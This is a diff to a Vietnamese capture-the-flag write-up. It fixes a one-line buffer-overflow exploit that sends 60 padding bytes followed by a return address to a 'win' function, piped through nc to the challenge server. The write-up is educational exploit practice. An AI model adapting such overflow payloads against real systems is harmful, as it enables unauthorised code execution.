@@ -374,7 +374,7 @@
 - Với cái lỗi trên thì ta hiểu được là cái này sẽ chạy đoạn mã ở địa chỉ mà ta nhập vào và ở đây sẽ cần ghi địa chỉ của hàm win vào.
 - Đoạn mã tham khảo : 
     ```
-    echo -e "$(python3 -c 'print ("A"*60'))\x86\x86\x04\x08" | nc thekidofarcrania.com 4902"
+    echo -e "$(python -c 'print("a"*60)')\x86\x85\x04\x08" | nc thekidofarcrania.com 4902
     ```
 
 ## Help Bity
